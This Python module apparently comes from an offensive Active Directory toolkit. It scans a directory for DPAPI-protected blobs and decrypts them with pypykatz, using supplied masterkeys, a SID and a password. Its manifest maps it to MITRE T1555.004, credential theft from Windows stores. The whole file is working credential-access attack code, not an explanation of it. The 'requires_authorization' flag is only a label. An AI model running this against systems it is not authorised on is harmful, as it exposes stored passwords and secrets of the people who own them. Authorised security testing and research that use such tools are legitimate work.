"""DPAPI decrypt pipeline: blob → masterkey GUID → decrypt with prekeys."""
from __future__ import annotations
import sys
from pathlib import Path
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.credential.dpapi_decrypt.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["dpapi_decryption"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1555.004"],
}

DPAPI_MAGIC = b"\x01\x00\x00\x00\xd0\x8c\x9d\xdf"


def _find_dpapi_blobs(path: Path) -> list[Path]:
    """Find files containing DPAPI magic bytes."""
    blobs = []
    for f in path.rglob("*"):
        if f.is_file() and f.stat().st_size < 10_000_000:
            try:
                data = f.read_bytes()
                if DPAPI_MAGIC in data:
                    blobs.append(f)
            except (PermissionError, OSError):
                pass
    return blobs


def run(args: Any) -> int:
    target_path = getattr(args, "dpapi_path", None)
    masterkey_dir = getattr(args, "masterkey_dir", None)
    sid = getattr(args, "sid", None)
    password = getattr(args, "password", None)

    if not target_path:
        print("[!] --dpapi-path required (blob file or directory)", file=sys.stderr)
        return 1

    try:
        from pypykatz.dpapi.dpapi import DPAPI
    except ImportError:
        print("[!] pypykatz not installed: pip install pypykatz", file=sys.stderr)
        return 1

    path = Path(target_path)
    if path.is_dir():
        blobs = _find_dpapi_blobs(path)
        print("[*] Found {} DPAPI blobs in {}".format(len(blobs), path))
    else:
        blobs = [path]

    dpapi = DPAPI()
    decrypted = 0
    for blob_path in blobs:
        try:
            data = blob_path.read_bytes()
            result = dpapi.decrypt_blob(data, masterkey_dir=masterkey_dir,
                                        sid=sid, password=password)
            if result:
                print("[+] Decrypted: {} → {} bytes".format(blob_path.name, len(result)))
                decrypted += 1
        except Exception as exc:
            print("[-] {}: {}".format(blob_path.name, exc))

    print("[*] Decrypted {}/{} blobs".format(decrypted, len(blobs)))
    return 0 if decrypted > 0 else 1
